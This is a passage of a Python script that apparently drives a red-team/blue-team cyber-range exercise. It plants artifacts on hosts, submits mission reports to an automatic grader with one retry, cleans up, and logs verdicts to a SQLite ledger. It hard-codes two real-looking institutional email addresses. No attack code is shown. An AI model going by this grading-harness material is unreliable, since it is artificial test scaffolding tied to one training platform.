        RED_EMAIL="shin@ync.ac.kr"; BLUE_EMAIL="mrgrit@ync.ac.kr"
        BHOST=RHOST=EL34_HOST; suf="shin"
        st,b=vh.create_duel(scn_int,RED_EMAIL,2,BLUE_EMAIL,1,monitor="bastion"); bid=b["battle"]["id"]; vh.start(bid,RED_EMAIL)
    print(f"[{a.sid}/{a.mode}] battle={bid} red_host={RHOST} blue_host={BHOST}", flush=True)
    P=Planted(); results=[]

    def submit_grade(email, side, m, host, planter, etype, deftarget):
        wd, wh = planter(host, m, P) if side=="blue" else planter(host, m, suf, P)
        time.sleep(2)
        st, sub = vh.submit(bid, email, side=side, order=m["order"], event_type=etype,
            target=m.get("target_vm") or deftarget, what_i_did=wd, what_happened=wh,
            description=f"{side.upper()}-{m['order']}")
        r = vh.wait_grade(sub["id"], email, 420) if st < 300 else None
        # 타임아웃/파싱불가(review·None)·grade 실패 → 1회 재시도(전송 자체 실패 아니면)
        if (not r) or (r.get("verdict") in (None, "review")) or (r.get("grade_status")=="failed"):
            time.sleep(4)
            st2, sub2 = vh.submit(bid, email, side=side, order=m["order"], event_type=etype,
                target=m.get("target_vm") or deftarget, what_i_did=wd, what_happened=wh,
                description=f"{side.upper()}-{m['order']} (retry)")
            r2 = vh.wait_grade(sub2["id"], email, 420) if st2 < 300 else None
            if r2 and r2.get("verdict") not in (None, "review"):
                r = r2
        return r

    try:
        for m in reds:
            r = submit_grade(RED_EMAIL, "red", m, RHOST, plant_red, "exploit", "web")
            results.append(("red", m["order"], r, m.get("points")))
            print(f"  RED-{m['order']}: {r.get('verdict') if r else 'ERR'} {r.get('awarded_points') if r else ''}/{m.get('points')}", flush=True)
        for m in blues:
            r = submit_grade(BLUE_EMAIL, "blue", m, BHOST, plant_blue, "detect", "siem")
            results.append(("blue", m["order"], r, m.get("points")))
            print(f"  BLUE-{m['order']}: {r.get('verdict') if r else 'ERR'} {r.get('awarded_points') if r else ''}/{m.get('points')}", flush=True)
    finally:
        # 예외가 나도 배틀 종료 + 아티팩트 cleanup 은 항상 수행(누수 방지).
        try: vh.end(bid, RED_EMAIL)
        except Exception as e: print(f"  (end err: {e})", flush=True)
        try: cleanup(RHOST, P, blue_host=BHOST)
        except Exception as e: print(f"  (cleanup err: {e})", flush=True)
    # ledger
    c=sqlite3.connect(LEDGER)
    for side,order,r,mx in results:
        ver=r.get("verdict") if r else None
        led="pass" if ver=="pass" else "partial" if ver=="partial" else "fail" if ver=="fail" else "error"
        c.execute("""UPDATE missions SET status=?,awarded=?,verdict=?,battle_id=?,
            submission_id=?,attempts=attempts+1,notes=?,updated_at=datetime('now')
            WHERE scenario_id=? AND mode=? AND side=? AND mission_order=?""",
            (led, (r.get("awarded_points") if r else None), ver, bid,
             (r.get("id") if r else None), ((r.get("feedback") or "")[:150] if r else "no-grade"),
             a.sid, a.mode, side, order))
    c.execute("UPDATE scenario_state SET status='done',battle_id=?,updated_at=datetime('now') WHERE scenario_id=? AND mode=?",(bid,a.sid,a.mode))
    c.commit()
    npass=sum(1 for _,_,r,_ in results if r and r.get("verdict")=="pass")
    npart=sum(1 for _,_,r,_ in results if r and r.get("verdict")=="partial")
    nbad=sum(1 for _,_,r,_ in results if not r or r.get("verdict") in ("fail",None,"review"))
    print(f"=== {a.sid}/{a.mode}: pass{npass} partial{npart} bad{nbad} / {len(results)} ===", flush=True)
    return {"sid":a.sid,"mode":a.mode,"battle":bid,"pass":npass,"partial":npart,"bad":nbad,
            "results":[(s,o,(r.get("verdict") if r else None),(r.get("awarded_points") if r else None),mx) for s,o,r,mx in results]}

def main():
    ap=argparse.ArgumentParser()
    ap.add_argument("sid"); ap.add_argument("mode",choices=["solo","duel"])
    ap.add_argument("--target",default="192.168.0.151")
    a=ap.parse_args()
    run_one(a.sid,a.mode,a.target)

if __name__=="__main__":
    main()
